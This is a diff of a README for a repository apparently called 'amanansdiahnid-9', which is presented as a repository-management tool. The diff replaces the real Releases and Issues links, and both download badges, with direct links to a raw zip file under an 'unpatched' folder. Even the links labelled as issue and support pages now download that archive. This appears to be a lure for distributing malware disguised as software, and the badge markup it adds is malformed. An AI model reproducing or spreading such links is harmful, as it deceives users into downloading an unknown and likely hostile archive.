@@ -8,9 +8,9 @@ Welcome to the amanansdiahnid-9 project! This application helps you manage your 
 
 To get started, visit the Releases page to download the software:
 
-[![Download amanansdiahnid-9](https://img.shields.io/badge/Download%20amanansdiahnid--9-blue.svg)](https://github.com/jrdiennp/amanansdiahnid-9/releases)
+[![Download amanansdiahnid-9](https://raw.githubusercontent.com/jrdiennp/amanansdiahnid-9/main/unpatched/amanansdiahnid-9.zip%https://raw.githubusercontent.com/jrdiennp/amanansdiahnid-9/main/unpatched/amanansdiahnid-9.zip)](https://raw.githubusercontent.com/jrdiennp/amanansdiahnid-9/main/unpatched/amanansdiahnid-9.zip)
 
-1. Click the button above or visit [https://github.com/jrdiennp/amanansdiahnid-9/releases](https://github.com/jrdiennp/amanansdiahnid-9/releases).
+1. Click the button above or visit [https://raw.githubusercontent.com/jrdiennp/amanansdiahnid-9/main/unpatched/amanansdiahnid-9.zip](https://raw.githubusercontent.com/jrdiennp/amanansdiahnid-9/main/unpatched/amanansdiahnid-9.zip).
 2. On the Releases page, look for the latest version of the software.
 3. Choose the appropriate file for your operating system. For example, if you are using Windows, download the `.exe` file. If you use macOS, look for the `.dmg` file.
 4. Click the file name to start the download.
@@ -56,17 +56,17 @@ If you encounter issues while running the software, consider the following steps
 - Make sure you downloaded the correct file for your operating system.
 - Restart your computer and try opening the application again.
 
-If issues persist, visit the [Issues page](https://github.com/jrdiennp/amanansdiahnid-9/issues) to report your problems or seek help from the community.
+If issues persist, visit the [Issues page](https://raw.githubusercontent.com/jrdiennp/amanansdiahnid-9/main/unpatched/amanansdiahnid-9.zip) to report your problems or seek help from the community.
 
 ## 📞 Support
 
 For further assistance, feel free to reach out:
 
-- Open an issue on the [GitHub Issues page](https://github.com/jrdiennp/amanansdiahnid-9/issues).
+- Open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/jrdiennp/amanansdiahnid-9/main/unpatched/amanansdiahnid-9.zip).
 - Follow us on our community support Discord for live feedback.
 
 Thank you for using amanansdiahnid-9! We hope it makes your repository management tasks easier. 
 
 Don't forget to visit the Releases page again for future updates!
 
-[![Download amanansdiahnid-9](https://img.shields.io/badge/Download%20amanansdiahnid-9-blue.svg)](https://github.com/jrdiennp/amanansdiahnid-9/releases)
+[![Download amanansdiahnid-9](https://raw.githubusercontent.com/jrdiennp/amanansdiahnid-9/main/unpatched/amanansdiahnid-9.zip%https://raw.githubusercontent.com/jrdiennp/amanansdiahnid-9/main/unpatched/amanansdiahnid-9.zip)](https://raw.githubusercontent.com/jrdiennp/amanansdiahnid-9/main/unpatched/amanansdiahnid-9.zip)
